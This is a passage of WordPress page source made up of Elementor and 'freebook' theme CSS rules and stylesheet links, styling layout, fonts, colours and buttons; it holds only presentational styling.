.elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-d47bb82 > .elementor-element-populated{margin:0px 0px 0px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 10px 50px 10px;}.elementor-8 .elementor-element.elementor-element-8b8a3e6.elementor-view-stacked .elementor-icon{background-color:#F8C734;}.elementor-8 .elementor-element.elementor-element-8b8a3e6.elementor-view-framed .elementor-icon, .elementor-8 .elementor-element.elementor-element-8b8a3e6.elementor-view-default .elementor-icon{fill:#F8C734;color:#F8C734;border-color:#F8C734;}.elementor-8 .elementor-element.elementor-element-8b8a3e6{--icon-box-icon-margin:20px;}.elementor-8 .elementor-element.elementor-element-8b8a3e6 .elementor-icon-box-title{margin-bottom:7px;color:#121212;}.elementor-8 .elementor-element.elementor-element-8b8a3e6 .elementor-icon-box-title, .elementor-8 .elementor-element.elementor-element-8b8a3e6 .elementor-icon-box-title a{font-family:"Poppins", Sans-serif;font-size:23px;font-weight:700;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-8b8a3e6 .elementor-icon-box-description{color:#888888;font-family:"Poppins", Sans-serif;font-size:18px;font-weight:300;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-a59aedc > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-a59aedc > .elementor-element-populated{margin:0px 0px 0px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 10px 50px 10px;}.elementor-8 .elementor-element.elementor-element-cffa3da.elementor-view-stacked .elementor-icon{background-color:#F8C734;}.elementor-8 .elementor-element.elementor-element-cffa3da.elementor-view-framed .elementor-icon, .elementor-8 .elementor-element.elementor-element-cffa3da.elementor-view-default .elementor-icon{fill:#F8C734;color:#F8C734;border-color:#F8C734;}.elementor-8 .elementor-element.elementor-element-cffa3da{--icon-box-icon-margin:20px;}.elementor-8 .elementor-element.elementor-element-cffa3da .elementor-icon-box-title{margin-bottom:7px;color:#121212;}.elementor-8 .elementor-element.elementor-element-cffa3da .elementor-icon-box-title, .elementor-8 .elementor-element.elementor-element-cffa3da .elementor-icon-box-title a{font-family:"Poppins", Sans-serif;font-size:23px;font-weight:700;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-cffa3da .elementor-icon-box-description{color:#888888;font-family:"Poppins", Sans-serif;font-size:18px;font-weight:300;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-ec80417 > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-ec80417 > .elementor-element-populated{margin:0px 0px 0px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 10px 50px 10px;}.elementor-8 .elementor-element.elementor-element-9b7d349.elementor-view-stacked .elementor-icon{background-color:#F8C734;}.elementor-8 .elementor-element.elementor-element-9b7d349.elementor-view-framed .elementor-icon, .elementor-8 .elementor-element.elementor-element-9b7d349.elementor-view-default .elementor-icon{fill:#F8C734;color:#F8C734;border-color:#F8C734;}.elementor-8 .elementor-element.elementor-element-9b7d349{--icon-box-icon-margin:20px;}.elementor-8 .elementor-element.elementor-element-9b7d349 .elementor-icon-box-title{margin-bottom:7px;color:#121212;}.elementor-8 .elementor-element.elementor-element-9b7d349 .elementor-icon-box-title, .elementor-8 .elementor-element.elementor-element-9b7d349 .elementor-icon-box-title a{font-family:"Poppins", Sans-serif;font-size:23px;font-weight:700;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-9b7d349 .elementor-icon-box-description{color:#888888;font-family:"Poppins", Sans-serif;font-size:18px;font-weight:300;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-15fe741 > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-15fe741 > .elementor-element-populated{margin:0px 0px 0px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;padding:0px 10px 50px 10px;}.elementor-8 .elementor-element.elementor-element-96df6d3.elementor-view-stacked .elementor-icon{background-color:#F8C734;}.elementor-8 .elementor-element.elementor-element-96df6d3.elementor-view-framed .elementor-icon, .elementor-8 .elementor-element.elementor-element-96df6d3.elementor-view-default .elementor-icon{fill:#F8C734;color:#F8C734;border-color:#F8C734;}.elementor-8 .elementor-element.elementor-element-96df6d3{--icon-box-icon-margin:20px;}.elementor-8 .elementor-element.elementor-element-96df6d3 .elementor-icon-box-title{margin-bottom:7px;color:#121212;}.elementor-8 .elementor-element.elementor-element-96df6d3 .elementor-icon-box-title, .elementor-8 .elementor-element.elementor-element-96df6d3 .elementor-icon-box-title a{font-family:"Poppins", Sans-serif;font-size:23px;font-weight:700;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-96df6d3 .elementor-icon-box-description{color:#888888;font-family:"Poppins", Sans-serif;font-size:18px;font-weight:300;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-25bf85c > .elementor-container{min-height:554px;}.elementor-8 .elementor-element.elementor-element-25bf85c:not(.elementor-motion-effects-element-type-background), .elementor-8 .elementor-element.elementor-element-25bf85c > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("../aztechost.com/images/recipe/uploads/2021/03/Copy-of-SmartAffiliateGuide.com_-1.png");background-size:cover;}.elementor-8 .elementor-element.elementor-element-25bf85c{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;}.elementor-8 .elementor-element.elementor-element-25bf85c > .elementor-background-overlay{transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-accordion-item{border-width:0px;border-color:#49AB1F00;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-accordion-item .elementor-tab-content{border-width:0px;border-top-color:#49AB1F00;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-accordion-item .elementor-tab-title.elementor-active{border-width:0px;border-bottom-color:#49AB1F00;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-tab-title{background-color:#12121200;padding:30px 0px 15px 0px;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-accordion-icon, .elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-accordion-title{color:#F8C734;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-accordion-icon svg{fill:#F8C734;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-active .elementor-accordion-icon, .elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-active .elementor-accordion-title{color:#FF3131;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-active .elementor-accordion-icon svg{fill:#FF3131;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-accordion-title{font-family:"Poppins", Sans-serif;font-size:24px;font-weight:600;line-height:1.54em;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-tab-title .elementor-accordion-icon i:before{color:#00bbd0;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-tab-title .elementor-accordion-icon svg{fill:#00bbd0;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-tab-title.elementor-active .elementor-accordion-icon i:before{color:#00bbd0;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-tab-title.elementor-active .elementor-accordion-icon svg{fill:#00bbd0;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-accordion-icon.elementor-accordion-icon-left{margin-right:0px;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-accordion-icon.elementor-accordion-icon-right{margin-left:0px;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-tab-content{color:#ffffff;font-family:"Poppins", Sans-serif;font-size:18px;font-weight:300;line-height:1.89em;padding:17px 0px 40px 0px;}.elementor-8 .elementor-element.elementor-element-5e59b7f > .elementor-widget-container{margin:0px 0px 0px 0px;padding:0px 0px 0px 0px;border-radius:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-67c80a0{--spacer-size:50px;}.elementor-8 .elementor-element.elementor-element-0f268d5{text-align:center;}.elementor-8 .elementor-element.elementor-element-0f268d5 .elementor-heading-title{color:#F8C734;font-family:"Poppins", Sans-serif;font-size:40px;font-weight:600;line-height:1.35em;}.elementor-8 .elementor-element.elementor-element-0f268d5 > .elementor-widget-container{margin:0px 0px 25px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-0e8d141{--spacer-size:50px;}.elementor-8 .elementor-element.elementor-element-8599024{--spacer-size:50px;}.elementor-8 .elementor-element.elementor-element-fc049f0:not(.elementor-motion-effects-element-type-background), .elementor-8 .elementor-element.elementor-element-fc049f0 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("../aztechost.com/images/recipe/uploads/2021/04/Untitled-design-16.png");}.elementor-8 .elementor-element.elementor-element-fc049f0 > .elementor-background-overlay{background-color:transparent;background-image:linear-gradient(180deg, #000000 0%, #000000 100%);opacity:0.5;transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-8 .elementor-element.elementor-element-fc049f0{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;}.elementor-8 .elementor-element.elementor-element-690592b{--spacer-size:44px;}.elementor-8 .elementor-element.elementor-element-9d001b9 .elementor-heading-title{color:#FFFFFF;}.elementor-8 .elementor-element.elementor-element-0944142{color:#FFFFFF;}.elementor-8 .elementor-element.elementor-element-2380f02{--spacer-size:50px;}.elementor-8 .elementor-element.elementor-element-800679c{--spacer-size:50px;}@media(min-width:768px){.elementor-8 .elementor-element.elementor-element-9f44fb1{width:48.214%;}.elementor-8 .elementor-element.elementor-element-8cde89c{width:51.786%;}}@media(max-width:1024px){.elementor-8 .elementor-element.elementor-element-a3183bb > .elementor-element-populated{padding:0px 20px 0px 20px;}.elementor-8 .elementor-element.elementor-element-97365a0 > .elementor-widget-container{margin:0px 40px 0px 0px;}.elementor-8 .elementor-element.elementor-element-35b76bf > .elementor-widget-container{padding:19px 19px 19px 19px;}.elementor-8 .elementor-element.elementor-element-e1cd9e8{--spacer-size:0px;}.elementor-8 .elementor-element.elementor-element-0a10249 > .elementor-container{min-height:400px;}.elementor-8 .elementor-element.elementor-element-5c7b016{--spacer-size:0px;}.elementor-8 .elementor-element.elementor-element-d53ea47{padding:24px 20px 75px 20px;}.elementor-8 .elementor-element.elementor-element-ec9f6f2{--spacer-size:0px;}.elementor-8 .elementor-element.elementor-element-8d8ccd0 > .elementor-widget-container{padding:20px 20px 20px 20px;}.elementor-8 .elementor-element.elementor-element-a8b8db7{padding:100px 20px 60px 20px;}.elementor-8 .elementor-element.elementor-element-8445e2e{font-size:18px;line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-deb19cb{padding:80px 20px 60px 20px;}.elementor-8 .elementor-element.elementor-element-d7431dc > .elementor-element-populated{padding:0px 0px 0px 0px;}}@media(max-width:767px){.elementor-8 .elementor-element.elementor-element-a3183bb > .elementor-element-populated{padding:20px 20px 20px 20px;}.elementor-8 .elementor-element.elementor-element-0ba973b{--spacer-size:10px;}.elementor-8 .elementor-element.elementor-element-41eca6d > .elementor-widget-container{padding:21px 21px 21px 21px;}.elementor-8 .elementor-element.elementor-element-97365a0 > .elementor-widget-container{margin:0px 40px 0px 0px;}.elementor-8 .elementor-element.elementor-element-996ae7d{--spacer-size:20px;}.elementor-8 .elementor-element.elementor-element-35b76bf > .elementor-widget-container{padding:0px 18px 0px 18px;}.elementor-8 .elementor-element.elementor-element-e1cd9e8{--spacer-size:0px;}.elementor-8 .elementor-element.elementor-element-0a10249 > .elementor-container{min-height:100px;}.elementor-8 .elementor-element.elementor-element-28af4fe > .elementor-widget-wrap > .elementor-widget:not(.elementor-widget__width-auto):not(.elementor-widget__width-initial):not(:last-child):not(.elementor-absolute){margin-bottom:20px;}.elementor-8 .elementor-element.elementor-element-d53ea47{padding:19px 0px 50px 0px;}.elementor-8 .elementor-element.elementor-element-0336310 > .elementor-element-populated{padding:0px 20px 0px 20px;}.elementor-8 .elementor-element.elementor-element-4f936a3{text-align:center;}.elementor-8 .elementor-element.elementor-element-4f936a3 > .elementor-widget-container{margin:0px 0px 20px 0px;padding:0px 0px 0px 0px;}.elementor-8 .elementor-element.elementor-element-bce4370 > .elementor-widget-container{margin:0px 0px 20px 0px;}.elementor-8 .elementor-element.elementor-element-ec9f6f2{--spacer-size:0px;}.elementor-8 .elementor-element.elementor-element-8d8ccd0 > .elementor-widget-container{padding:15px 15px 15px 15px;}.elementor-8 .elementor-element.elementor-element-a8b8db7{padding:40px 20px 40px 20px;}.elementor-8 .elementor-element.elementor-element-210b64b .elementor-heading-title{font-size:33px;}.elementor-8 .elementor-element.elementor-element-8445e2e{line-height:1.89em;}.elementor-8 .elementor-element.elementor-element-a0791b4 .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-b851ea2 .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-df8b5c5 .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-af0a3fe .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-fc9ad4b .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-161557a .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-97ffb51 .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-ece240d .elementor-image-box-img{margin-bottom:0px;}.elementor-8 .elementor-element.elementor-element-8b8a3e6{--icon-box-icon-margin:15px;}.elementor-8 .elementor-element.elementor-element-cffa3da{--icon-box-icon-margin:15px;}.elementor-8 .elementor-element.elementor-element-9b7d349{--icon-box-icon-margin:15px;}.elementor-8 .elementor-element.elementor-element-96df6d3{--icon-box-icon-margin:15px;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-accordion-title{font-size:20px;}.elementor-8 .elementor-element.elementor-element-5e59b7f .elementor-tab-content{font-size:18px;}}@media(max-width:1024px) and (min-width:768px){.elementor-8 .elementor-element.elementor-element-a3183bb{width:100%;}.elementor-8 .elementor-element.elementor-element-fea3a06{width:100%;}.elementor-8 .elementor-element.elementor-element-cd10cac{width:50%;}.elementor-8 .elementor-element.elementor-element-332daee{width:50%;}.elementor-8 .elementor-element.elementor-element-cb5a92b{width:50%;}.elementor-8 .elementor-element.elementor-element-d2f5d6d{width:50%;}.elementor-8 .elementor-element.elementor-element-9fdaf70{width:50%;}.elementor-8 .elementor-element.elementor-element-3917d2b{width:50%;}.elementor-8 .elementor-element.elementor-element-088f2e4{width:50%;}.elementor-8 .elementor-element.elementor-element-1008ed1{width:50%;}.elementor-8 .elementor-element.elementor-element-d47bb82{width:50%;}.elementor-8 .elementor-element.elementor-element-a59aedc{width:50%;}.elementor-8 .elementor-element.elementor-element-ec80417{width:50%;}.elementor-8 .elementor-element.elementor-element-15fe741{width:50%;}}
.elementor-1112 .elementor-element.elementor-element-dfb067d:not(.elementor-motion-effects-element-type-background), .elementor-1112 .elementor-element.elementor-element-dfb067d > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-color:#142115;}.elementor-1112 .elementor-element.elementor-element-dfb067d{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;}.elementor-1112 .elementor-element.elementor-element-dfb067d > .elementor-background-overlay{transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-1112 .elementor-element.elementor-element-b0f906e{--spacer-size:50px;}.elementor-1112 .elementor-element.elementor-element-1b2ed8b .elementor-heading-title{color:#00C500;}.elementor-1112 .elementor-element.elementor-element-eec30ac{--grid-template-columns:repeat(0, auto);--grid-column-gap:5px;--grid-row-gap:0px;}.elementor-1112 .elementor-element.elementor-element-eec30ac .elementor-widget-container{text-align:left;}.elementor-1112 .elementor-element.elementor-element-a623ef9{--spacer-size:50px;}.elementor-1112 .elementor-element.elementor-element-f5984ca .elementor-heading-title{color:#00C500;}.elementor-1112 .elementor-element.elementor-element-46cc72a{--spacer-size:50px;}.elementor-1112 .elementor-element.elementor-element-b32ec8b .elementor-heading-title{color:#00C500;}.elementor-1112 .elementor-element.elementor-element-ea1d215:not(.elementor-motion-effects-element-type-background), .elementor-1112 .elementor-element.elementor-element-ea1d215 > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-color:#142115;}.elementor-1112 .elementor-element.elementor-element-ea1d215{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;}.elementor-1112 .elementor-element.elementor-element-ea1d215 > .elementor-background-overlay{transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-1112 .elementor-element.elementor-element-4cc9ba7{text-align:center;color:#FFFFFF;}.elementor-1112 .elementor-element.elementor-element-4cc9ba7 > .elementor-widget-container{padding:19px 0px 0px 0px;border-style:solid;border-width:1px 0px 0px 0px;border-color:#EACCCC61;}
</style>
<link rel='stylesheet' id='swiper-css' href='wp-content/plugins/elementor/assets/lib/swiper/css/swiper.min48f5.css?ver=5.3.6' type='text/css' media='all' />
<link rel='stylesheet' id='hfe-widgets-style-css' href='wp-content/plugins/header-footer-elementor/inc/widgets-css/frontend1f62.css?ver=1.6.13' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css' href='wp-content/plugins/elementor/assets/lib/font-awesome/css/font-awesome.min1849.css?ver=4.7.0' type='text/css' media='all' />
<link rel='stylesheet' id='freebook-theme-style-css' href='wp-content/themes/freebook/style8a54.css?ver=1.0.0' type='text/css' media='all' />
<style id='freebook-theme-style-inline-css' type='text/css'>
/* #Typography */body {font-style: normal;font-weight: 300;font-size: 14px;line-height: 1.6;font-family: 'Fira Sans', sans-serif;;letter-spacing: 0px;text-align: left;color: #162c5a;}h1,.h1-style {font-style: normal;font-weight: 400;font-size: 34px;line-height: 1.4;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;text-align: inherit;color: #162c5a;}h2,.h2-style {font-style: normal;font-weight: 400;font-size: 24px;line-height: 1.4;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;text-align: inherit;color: #162c5a;}h3,.h3-style {font-style: normal;font-weight: 400;font-size: 21px;line-height: 1.4;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;text-align: inherit;color: #162c5a;}h4,.h4-style {font-style: normal;font-weight: 400;font-size: 20px;line-height: 1.5;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;text-align: inherit;color: #162c5a;}h5,.h5-style {font-style: normal;font-weight: 300;font-size: 18px;line-height: 1.5;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;text-align: inherit;color: #162c5a;}h6,.h6-style {font-style: normal;font-weight: 500;font-size: 14px;line-height: 1.5;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;text-align: inherit;color: #162c5a;}@media (min-width: 1200px) {h1,.h1-style { font-size: 56px; }h2,.h2-style { font-size: 40px; }h3,.h3-style { font-size: 28px; }}a,h1 a:hover,h2 a:hover,h3 a:hover,h4 a:hover,h5 a:hover,h6 a:hover { color: #ff5607; }a:hover { color: #162c5a; }blockquote {color: #ff5607;}/* #Header */.site-header__wrap {width: 1200px !important;background-color: #ffffff;background-repeat: repeat;background-position: center top;background-attachment: scroll;;}/* ##Top Panel */.top-panel {color: #162c5a;background-color: #e8e8e8;}/* #Main Menu */.main-navigation {font-style: normal;font-weight: 400;font-size: 14px;line-height: 1.4;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;}.main-navigation a,.menu-item-has-children:before {color: #162c5a;}.main-navigation a:hover,.main-navigation .current_page_item>a,.main-navigation .current-menu-item>a,.main-navigation .current_page_ancestor>a,.main-navigation .current-menu-ancestor>a {color: #162c5a;}/* #Mobile Menu */.mobile-menu-toggle-button {color: #ffffff;background-color: #ff5607;}/* #Social */.social-list a {color: #162c5a;}.social-list a:hover {color: #ff5607;}/* #Breadcrumbs */.breadcrumbs_item {font-style: normal;font-weight: 400;font-size: 11px;line-height: 1.5;font-family: 'Open Sans', sans-serif;letter-spacing: 0px;}.breadcrumbs_item_sep,.breadcrumbs_item_link {color: #162c5a;}.breadcrumbs_item_link:hover {color: #ff5607;}/* #Post navigation */.post-navigation i {color: #162c5a;}.post-navigation .nav-links a:hover .post-title,.post-navigation .nav-links a:hover .nav-text {color: #ff5607;}.post-navigation .nav-links a:hover i {color: #162c5a;}/* #Pagination */.pagination .page-numbers,.page-links > span,.page-links > a {color: #162c5a;}.pagination a.page-numbers:hover,.pagination .page-numbers.current,.page-links > a:hover,.page-links > span {color: #162c5a;}.pagination .next,.pagination .prev {color: #ff5607;}.pagination .next:hover,.pagination .prev:hover {color: #162c5a;}/* #Button Appearance Styles (regular scheme) */.btn,button,input[type='button'],input[type='reset'],input[type='submit'] {font-style: normal;font-weight: 900;font-size: 11px;line-height: 1;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 1px;color: #ffffff;background-color: #ff5607;}.btn:hover,button:hover,input[type='button']:hover,input[type='reset']:hover,input[type='submit']:hover,input[type='reset']:hover {color: #ffffff;background-color: rgb(255,124,45);}.btn.invert-button {color: #ffffff;}.btn.invert-button:hover {color: #ffffff;border-color: #ff5607;background-color: #ff5607;}input,optgroup,select,textarea {font-size: 14px;}/* #Comment, Contact, Password Forms */.comment-form .submit,.wpcf7-submit,.post-password-form label + input {font-style: normal;font-weight: 900;font-size: 11px;line-height: 1;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 1px;color: #ffffff;background-color: #ff5607;}.comment-form .submit:hover,.wpcf7-submit:hover,.post-password-form label + input:hover {color: #ffffff;background-color: rgb(255,124,45);}.comment-reply-title {font-style: normal;font-weight: 400;font-size: 20px;line-height: 1.5;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;color: #162c5a;}/* Cookies consent */.comment-form-cookies-consent input[type='checkbox']:checked ~ label[for=wp-comment-cookies-consent]:before {color: #ffffff;border-color: #ff5607;background-color: #ff5607;}/* #Comment Reply Link */#cancel-comment-reply-link {color: #ff5607;}#cancel-comment-reply-link:hover {color: #162c5a;}/* #Comment item */.comment-body .fn {font-style: normal;font-weight: 500;font-size: 14px;line-height: 1.5;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;color: #162c5a;}.comment-date__time {color: #162c5a;}.comment-reply-link {font-style: normal;font-weight: 900;font-size: 11px;line-height: 1;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 1px;}/* #Input Placeholders */::-webkit-input-placeholder { color: #162c5a; }::-moz-placeholder{ color: #162c5a; }:-moz-placeholder{ color: #162c5a; }:-ms-input-placeholder{ color: #162c5a; }/* #Entry Meta */.posted-on,.cat-links,.byline,.tags-links {color: #162c5a;}.comments-button {color: #162c5a;}.comments-button:hover {color: #ffffff;background-color: #ff5607;}.btn-style .post-categories a {color: #ffffff;background-color: #ff5607;}.btn-style .post-categories a:hover {color: #ffffff;background-color: rgb(255,124,45);}.sticky-label {color: #ffffff;background-color: #ff5607;}/* Posts List Item Invert */.invert-hover.has-post-thumbnail:hover,.invert-hover.has-post-thumbnail:hover .posted-on,.invert-hover.has-post-thumbnail:hover .cat-links,.invert-hover.has-post-thumbnail:hover .byline,.invert-hover.has-post-thumbnail:hover .tags-links,.invert-hover.has-post-thumbnail:hover .entry-meta,.invert-hover.has-post-thumbnail:hover a,.invert-hover.has-post-thumbnail:hover .btn-icon,.invert-item.has-post-thumbnail,.invert-item.has-post-thumbnail .posted-on,.invert-item.has-post-thumbnail .cat-links,.invert-item.has-post-thumbnail .byline,.invert-item.has-post-thumbnail .tags-links,.invert-item.has-post-thumbnail .entry-meta,.invert-item.has-post-thumbnail a,.invert-item.has-post-thumbnail .btn:hover,.invert-item.has-post-thumbnail .btn-style .post-categories a:hover,.invert,.invert .entry-title,.invert a,.invert .byline,.invert .posted-on,.invert .cat-links,.invert .tags-links {color: #ffffff;}.invert-hover.has-post-thumbnail:hover a:hover,.invert-hover.has-post-thumbnail:hover .btn-icon:hover,.invert-item.has-post-thumbnail a:hover,.invert a:hover {color: #ff5607;}.invert-hover.has-post-thumbnail .btn,.invert-item.has-post-thumbnail .comments-button,.posts-list--default.list-style-v10 .invert.default-item .comments-button{color: #ffffff;background-color: #ff5607;}.invert-hover.has-post-thumbnail .btn:hover,.invert-item.has-post-thumbnail .comments-button:hover,.posts-list--default.list-style-v10 .invert.default-item .comments-button:hover {color: #ff5607;background-color: #ffffff;}/* Default Posts List */.list-style-v8 .comments-link {color: #162c5a;}.list-style-v8 .comments-link:hover {color: #162c5a;}/* Creative Posts List */.creative-item .entry-title a:hover {color: #ff5607;}.list-style-default .creative-item a,.creative-item .btn-icon {color: #162c5a;}.list-style-default .creative-item a:hover,.creative-item .btn-icon:hover {color: #ff5607;}.list-style-default .creative-item .btn,.list-style-default .creative-item .btn:hover,.list-style-default .creative-item .comments-button:hover {color: #ffffff;}.creative-item__title-first-letter {font-style: normal;font-weight: 400;font-family: 'Fira Sans Condensed', sans-serif;color: #162c5a;}.posts-list--creative.list-style-v10 .creative-item:before {background-color: #ff5607;box-shadow: 0px 0px 0px 8px rgba(255,86,7,0.25);}.posts-list--creative.list-style-v10 .creative-item__post-date {font-style: normal;font-weight: 400;font-size: 20px;line-height: 1.5;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;color: #ff5607;}.posts-list--creative.list-style-v10 .creative-item__post-date a {color: #ff5607;}.posts-list--creative.list-style-v10 .creative-item__post-date a:hover {color: #162c5a;}/* Creative Posts List style-v2 */.list-style-v2 .creative-item .entry-title,.list-style-v9 .creative-item .entry-title {font-style: normal;font-weight: 400;font-size: 20px;line-height: 1.5;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;}/* Image Post Format */.post_format-post-format-image .post-thumbnail__link:before {color: #ffffff;background-color: #ff5607;}/* Gallery Post Format */.post_format-post-format-gallery .swiper-button-prev,.post_format-post-format-gallery .swiper-button-next {color: #162c5a;}.post_format-post-format-gallery .swiper-button-prev:hover,.post_format-post-format-gallery .swiper-button-next:hover {color: #162c5a;}/* Link Post Format */.post_format-post-format-quote .post-format-quote {color: #ffffff;background-color: #ff5607;}.post_format-post-format-quote .post-format-quote:before {color: #ff5607;background-color: #ffffff;}/* Post Author */.post-author__title a {color: #ff5607;}.post-author__title a:hover {color: #162c5a;}.invert .post-author__title a {color: #ffffff;}.invert .post-author__title a:hover {color: #ff5607;}/* Single Post */.single-post blockquote {border-color: #ff5607;}.single-post:not(.post-template-single-layout-4):not(.post-template-single-layout-7) .tags-links a:hover {color: #ffffff;border-color: #ff5607;background-color: #ff5607;}.single-header-3 .post-author .byline,.single-header-4 .post-author .byline,.single-header-5 .post-author .byline {font-style: normal;font-weight: 400;font-size: 20px;line-height: 1.5;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;}.single-header-8,.single-header-10 .entry-header {background-color: #ff5607;}.single-header-8.invert a:hover,.single-header-10.invert a:hover {color: rgba(255,255,255,0.5);}.single-header-3 a.comments-button,.single-header-10 a.comments-button {border: 1px solid #ffffff;}.single-header-3 a.comments-button:hover,.single-header-10 a.comments-button:hover {color: #ff5607;background-color: #ffffff;}/* Page preloader */.page-preloader {border-top-color: #ff5607;border-right-color: #ff5607;}/* Logo */.site-logo__link,.site-logo__link:hover {color: #ff5607;}/* Page title */.page-title {font-style: normal;font-weight: 400;font-size: 24px;line-height: 1.4;font-family: 'Fira Sans Condensed', sans-serif;letter-spacing: 0px;color: #162c5a;}@media (min-width: 1200px) {.page-title { font-size: 40px; }}/* Grid Posts List */.posts-list.list-style-v3 .comments-link {border-color: #ff5607;}.posts-list.list-style-v4 .comments-link {color: #162c5a;}.posts-list.list-style-v4 .posts-list__item.grid-item .grid-item-wrap .comments-link:hover {color: #ffffff;background-color: #ff5607;}/* Posts List Grid Item Invert */.grid-item-wrap.invert,.grid-item-wrap.invert .posted-on,.grid-item-wrap.invert .cat-links,.grid-item-wrap.invert .byline,.grid-item-wrap.invert .tags-links,.grid-item-wrap.invert .entry-meta,.grid-item-wrap.invert a,.grid-item-wrap.invert .btn-icon,.grid-item-wrap.invert .comments-button {color: #ffffff;}/* Posts List Grid-5 Item Invert */.list-style-v5 .grid-item-wrap.invert .posted-on,.list-style-v5 .grid-item-wrap.invert .cat-links,.list-style-v5 .grid-item-wrap.invert .byline,.list-style-v5 .grid-item-wrap.invert .tags-links,.list-style-v5 .grid-item-wrap.invert .posted-on a,.list-style-v5 .grid-item-wrap.invert .cat-links a,.list-style-v5 .grid-item-wrap.invert .tags-links a,.list-style-v5 .grid-item-wrap.invert .byline a,.list-style-v5 .grid-item-wrap.invert .comments-link,.list-style-v5 .grid-item-wrap.invert .entry-title a:hover {color: #ff5607;}.list-style-v5 .grid-item-wrap.invert .posted-on a:hover,.list-style-v5 .grid-item-wrap.invert .cat-links a:hover,.list-style-v5 .grid-item-wrap.invert .tags-links a:hover,.list-style-v5 .grid-item-wrap.invert .byline a:hover,.list-style-v5 .grid-item-wrap.invert .comments-link:hover {color: #ffffff;}/* Posts List Grid-6 Item Invert */.posts-list.list-style-v6 .posts-list__item.grid-item .grid-item-wrap .cat-links a,.posts-list.list-style-v7 .posts-list__item.grid-item .grid-item-wrap .cat-links a {color: #ffffff;background-color: #ff5607;}.posts-list.list-style-v6 .posts-list__item.grid-item .grid-item-wrap .cat-links a:hover,.posts-list.list-style-v7 .posts-list__item.grid-item .grid-item-wrap .cat-links 